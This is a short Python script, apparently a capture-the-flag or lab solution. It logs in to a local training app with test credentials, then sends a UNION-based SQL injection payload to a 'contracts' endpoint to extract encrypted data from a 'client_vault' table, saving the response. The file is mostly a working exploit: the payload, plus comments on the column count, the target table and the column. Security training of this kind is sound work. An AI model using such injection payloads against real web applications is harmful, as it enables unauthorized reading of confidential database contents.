import requests
import re

BASE_URL = "http://localhost:5000"
LOGIN_URL = f"{BASE_URL}/login"
SQLI_ADV_URL = f"{BASE_URL}/sqli/contracts"

s = requests.Session()
s.post(LOGIN_URL, data={'roll_no': 'SEC23001', 'password': 'compass123'})

# Task 02: SQLi Advanced
# Target: /sqli/contracts
# Parameter: client
# Query: SELECT client_name, scope, budget, confidential_notes FROM contracts WHERE ...
# Columns: 4
# Flag Table: client_vault
# Flag Column: encrypted_data
# Payload: ' UNION SELECT encrypted_data, 'b', 99999, 'd' FROM client_vault --


payload = "' UNION SELECT encrypted_data, 'b', 99999, 'd' FROM client_vault --"
r = s.get(SQLI_ADV_URL, params={'client': payload})

with open("task02_response.html", "w", encoding="utf-8") as f:
    f.write(r.text)

print("Response saved to task02_response.html")
